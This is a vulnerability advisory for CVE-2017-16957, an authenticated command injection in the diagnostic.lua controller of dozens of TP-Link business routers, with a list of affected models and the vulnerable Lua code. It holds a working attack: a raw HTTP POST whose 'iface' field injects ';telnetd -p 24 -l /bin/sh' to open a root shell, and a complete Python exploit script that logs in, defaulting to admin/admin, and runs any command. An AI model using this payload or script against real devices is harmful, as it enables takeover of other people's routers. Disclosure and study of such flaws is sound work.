CVE-2017-16957

[Vulnerability]:
Command Injection in diagnostic.lua 

------------------------------------------
[Exploitation]:
Can remote command execution on the root shell.

------------------------------------------
[Vendor of Product]:
Tp-Link router

------------------------------------------
[Affected Products and firmware version]:
Tp-Link TL-WVR300		(Only hardware version v4)
Tp-Link TL-WVR302		(only hardware version v2)
Tp-Link TL-WVR450		(ALL the hardware version and firmware version)
Tp-Link TL-WVR450L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR450G		(Only hardware version v5)
Tp-Link TL-WVR458		(ALL the hardware version and firmware version)
Tp-Link TL-WVR458L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR458P		(ALL the hardware version and firmware version)
Tp-Link TL-WVR900G		(Only hardware version v3)
Tp-Link TL-WVR900L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1200L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1300L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1300G		(ALL the hardware version and firmware version)
Tp-Link TL-WVR1750L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR2600L		(ALL the hardware version and firmware version)
Tp-Link TL-WVR4300L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR302		(ALL the hardware version and firmware version)
Tp-Link TL-WAR450		(ALL the hardware version and firmware version)
Tp-Link TL-WAR450L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR458		(ALL the hardware version and firmware version)
Tp-Link TL-WAR458L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR900L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR1200L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR1300L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR1750L		(ALL the hardware version and firmware version)
Tp-Link TL-WAR2600L		(ALL the hardware version and firmware version)
Tp-Link TL-ER3210G		(ALL the hardware version and firmware version)
Tp-Link TL-ER3220G		(ALL the hardware version and firmware version)
Tp-Link TL-ER5110G		(ALL the hardware version and firmware version)
Tp-Link TL-ER5120G		(ALL the hardware version and firmware version)
Tp-Link TL-ER5510G		(Only hardware version v2,v3)
Tp-Link TL-ER5520G		(Only hardware version v2,v3)
Tp-Link TL-ER6110G		(ALL the hardware version and firmware version)
Tp-Link TL-ER6120G		(Only hardware version v2)
Tp-Link TL-ER6220G		(ALL the hardware version and firmware version)
Tp-Link TL-ER6510G		(ALL the hardware version and firmware version)
Tp-Link TL-ER6520G		(Only hardware version v2,v3)
Tp-Link TL-ER7520G		(ALL the hardware version and firmware version)
Tp-Link TL-R473			(only hardware version v5)
Tp-Link TL-R473G		(ALL the hardware version and firmware version)
Tp-Link TL-R473P-AC		(ALL the hardware version and firmware version)
Tp-Link TL-R473GP-AC		(ALL the hardware version and firmware version)
Tp-Link TL-R478			(only hardware version v6)
Tp-Link TL-R478+		(only hardware version v7)
Tp-Link TL-R478G		(ALL the hardware version and firmware version)
Tp-Link TL-R478G+		(only hardware version v3)
Tp-Link TL-R479P-AC 		(ALL the hardware version and firmware version)
Tp-Link TL-R479GP-AC		(ALL the hardware version and firmware version)
Tp-Link TL-R479GPE-AC		(ALL the hardware version and firmware version)
Tp-Link TL-R483			(only hardware version v5)
Tp-Link TL-R483G		(only hardware version v2)
Tp-Link TL-R488			(Only hardware version v5)
Tp-Link TL-R4149G		(ALL the hardware version and firmware version)
Tp-Link TL-R4239G		(Only hardware version v2)
Tp-Link TL-R4299G		(Only hardware version v2)

------------------------------------------
[Attack Type]:
Remote

------------------------------------------
[Reference]:
http://service.tp-link.com.cn/download/201612/TL-WVR450L%20V1.0%E5%8D%87%E7%BA%A7%E8%BD%AF%E4%BB%B620161125.zip  (Official firmware for TL-WVR450L)
http://www.tp-link.com.cn/product_listsmb_2008_26_00_01_02_03_04.html
http://www.tp-link.com.cn/product_listsmb_2022_9_00_01_02_03.html
http://www.tp-link.com.cn/product_listsmb_2023_7_00_01_02.html

------------------------------------------
[Discoverer]:
Tianfeng Guan, Sichuan Silent Information Technology Co.,Ltd ,http://www.silence.com.cn/

------------------------------------------
[Affected components]:
Affected executable application: uhttpd
Affected source code file: /usr/lib/lua/luci/controller/admin/diagnostic.lua
Affected function: zone_get_effect_devices(t)

------------------------------------------
[Vulnerability details]:
After the web login Authentication, When accessing the diagnostic.lua through the web manager(uhttpd), 
we can run a system network connectivity check by the controller function start_action(http_form).
During this operation, it doesn't limit and check the value of the parameter "iface" in http post data.
And in the diagnostic.lua, it defines the local function zone_get_effect_devices(t) to handle input http post data "iface".

step1.	http post to diagnostic.lua and make method=start
step2.		--> local function start_action(http_form)
step3.			--> local function ping_action(http_form) 
step4.				--> local function zone_get_effect_devices(t)

local function zone_get_effect_devices(t)
    local devices 
    local cmd = ". /lib/zone/zone_api.sh; zone_get_effect_devices " .. t
    dbg("cmd:",cmd)
    local ff = io.popen(cmd, "r");
    if not ff then
        return devices
    end

    local l = ff:read("*l")
    return l
end

So, we can see the local function zone_get_effect_devices doesn't have any check and limit to the input parameter,
and it will use the io.popen to execute the shell command which include the value of the parameter "iface" in http post data.

------------------------------------------
[Exploitation details]:
Because access to the diagnostic.lua requires web authentication,so it needs the web login credentials, or a session hijack vulnerability, or a weak credentials brute force attack to get access permissions for the diagnostic.lua at first. 
And then, we can use this Authenticated Remote Command Execution vulnerability to execute any command on the root shell.
For example, we can send a http post request like:

POST /cgi-bin/luci/;stok=ea2178b4514da7ae227f4ec192536930/admin/diagnostic?form=diag HTTP/1.1
Host: 192.168.3.1
Content-Length: 370
Accept: application/json, text/javascript, */*; q=0.01
Origin: http://192.168.3.1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: http://192.168.3.1/webpages/index.html
Accept-Encoding: gzip, deflate
Cookie: sysauth=be9b6f2b4b9a76a8a658e108c6197f2c
Connection: close

data=%7B%22method%22%3A%22start%22%2C%22params%22%3A%7B%22type%22%3A%220%22%2C%22type_hidden%22%3A%220%22%2C%22ipaddr_ping%22%3A%22baidu.com%22%2C%22iface_ping%22%3A%22WAN1%22%2C%22ipaddr%22%3A%22baidu.com%22%2C%22iface%22%3A%22%3Btelnetd+-p+24+-l+/bin/sh%22%2C%22count%22%3A%221%22%2C%22pktsize%22%3A%2264%22%2C%22my_result%22%3A%22The+Router+is+ready.%5Cr%5Cn%22%7D%7D

Finally, this http post request packet will make the router execute the command "telnetd -p 24 -l /bin/sh".

------------------------------------------
[exp.py]:
# Tested product: TL-WVR450L
# Hardware versionï¼šV1.0
# Firmware version: 20161125
# The RSA_Encryption_For_Tplink.js is use for Rsa Encryption to the password when login the web manager.
# You can download the RSA_Encryption_For_Tplink.js by https://github.com/coincoin7/Wireless-Router-Vulnerability/blob/master/RSA_Encryption_For_Tplink.js

import execjs
import requests
import json
import urllib


def read_js():
    file = open("./RSA_Encryption_For_Tplink.js", 'r')
    line = file.readline()
    js = ''
    while line:
        js = js + line
        line = file.readline()
    file.close()
    return js


def execute(ip, port, username, passwd, cmd):

    try:
        s = requests.session()


        uri = "http://{}:{}".format(ip,port)
        headers = {
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'http://{}/webpages/login.html'.format(ip)
            }
        payload = {
            "method":"get"
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)
        rsa_public_n = json.loads(ret.text)['result']['password'][0].encode("utf-8")
        rsa_public_e = json.loads(ret.text)['result']['password'][1].encode("utf-8")
        js = read_js()
        js_handle = execjs.compile(js)
        password = js_handle.call('MainEncrypt', rsa_public_n, rsa_public_e, passwd)


        payload = {
            "method":"login",
            "params":{
                "username":"{}".format(username),
                "password":"{}".format(password)
            }
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok=/login?form=login', data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)
        stok = json.loads(ret.text)['result']['stok'].encode('utf-8')
        cookie = ret.headers['Set-Cookie']


        print '[+] Login success'
        print '[+] Get The Token: ' + stok
        print '[+] Get The Cookie: ' + cookie


        headers = {
            'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer':'http://{}/webpages/login.html'.format(ip),
            'Cookie':'{}'.format(cookie)
            }
        payload = {
            "method":"start",
            "params":{
                "type":"0",
                "type_hidden":"0",
                "ipaddr_ping":"127.0.0.1",
                "iface_ping":"WAN1",
                "ipaddr":"127.0.0.1",
                "iface":";{}".format(cmd),
                "count":"1",
                "pktsize":"64",
                "my_result":"exploit"
            }
        }
        ret = s.post(uri + '/cgi-bin/luci/;stok={}/admin/diagnostic?form=diag'.format(stok), data=urllib.urlencode({"data":json.dumps(payload)}), headers=headers, timeout=5)


        #print ret.text
        print '[+] Finish RCE'
        print '--------------------------------------------------------------'
        return True

    except:
        return False


if __name__=='__main__':
    print '-----------Tplink LUCI diagnostic Authenticated RCE-----------'
    print execute('192.168.1.1', 80, 'admin', 'admin', 'telnetd -p 24 -l /bin/sh')
